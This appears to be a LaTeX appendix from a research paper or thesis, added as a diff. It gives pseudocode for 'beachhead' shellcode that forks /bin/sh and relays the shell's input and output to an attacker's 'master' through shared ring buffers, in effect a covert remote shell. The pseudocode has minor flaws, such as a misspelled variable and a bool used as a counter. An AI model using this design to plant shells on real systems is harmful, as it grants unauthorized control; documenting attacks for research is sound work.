@@ -1,0 +1,99 @@
+\section{Beachhead shellcode, Pseudocode}
+
+\label{beachhead_pseudocode}
+
+\lstset{language=C, numbers=left, numberstyle=\tiny, frame=lines}
+\begin{center} \tiny
+\begin{lstlisting}
+// ringbuffer for data from beachhead to master
+RingBuffer	ToMaster;
+// ringbuffer for data from master to beachhead
+RingBuffer	FromMaster;
+
+// pipe for data from beachhead to shell
+int		ToShell[2];
+// pipe for data from shell to beachhead
+int		FromShell[2];
+// flag, if pipes are still valid (volatile because two threads access it)
+volatile bool	pipes_ok = 1;
+
+int		child_pid;
+// set by master if child should be killed
+volatile bool	terminate_child = 0;
+// set by beachhead to signal death of child
+bool		child_is_dead = 0;
+// set by master to acknowledge death of child
+volatile bool	child_is_dead_ACK = 0;
+
+start:
+	pipe(ToShell[]);
+	pipe(FromShell[]);
+	switch fork() {
+		case child:
+			dup2(ToShell[0], stdin);
+			dup2(FromShell[1], stdout);
+			dup2(FromShell[1], stderr);
+			execve("/bin/sh");
+			// on failure: exit.
+			exit();
+			;;
+		case parent:
+			child_pid = returnvalue of fork;
+			close(ToShell[0]);
+			close(FromShell[1]);
+			// create a second thread "WriterThread"
+			clone(WriterThread);
+			// current thread becomes "ReaderThread"
+			goto ReaderThread;
+			;;
+	}
+
+
+ReaderThread:
+	// the ReaderThread will read from the master and relay to the shell
+	while( pipes_ok ) {
+		if(terminate_child) {
+			// attacker requested shell to be terminated
+			kill(child_pid, SIGKILL);
+			pipes_ok = 0;
+			// ReaderThread terminates, WriterThread will do cleanup
+			exit();
+		}
+		if( isEmpty(FromMaster) ) {
+			sleep(0.001 seconds);
+		} else {
+			if(1 != write(ToShell[1], FromMaster.buffer
+					+FromMaster.currentLocation, 1 byte)) {
+				// can not communicate with child
+				pipes_ok = 0;
+			} else
+				FromMaster.currentLocation += 1;
+		}
+	}
+	exit();
+
+WriterThread:
+	// the WriterThread will read from the shell and relay to the master
+	while( pipes_ok ) {
+		if( isFull(ToMaster) ) {
+			sleep(0.001 seconds);
+		} else {
+			if(1 != read(FromShell[0], ToMaster.buffer
+					+ToMaster.currentLocation, 1 byte)) {
+				// can not communicate with child
+				pipes_ok = 0;
+			} else
+				ToMaster.currentLocation += 1;
+		}
+	}
+	// pipes are closed. tell the master, but wait at most 2 seconds
+	while(!chils_is_dead_ACK && child_is_dead <= 2) {
+		child_is_dead++;
+		sleep(1 second);
+	}
+	exit();
+\end{lstlisting}
+%	\caption{Beachhead shellcode (\texttt{dmashellcode.s}), pseudocode}
+\end{center} 
+
+
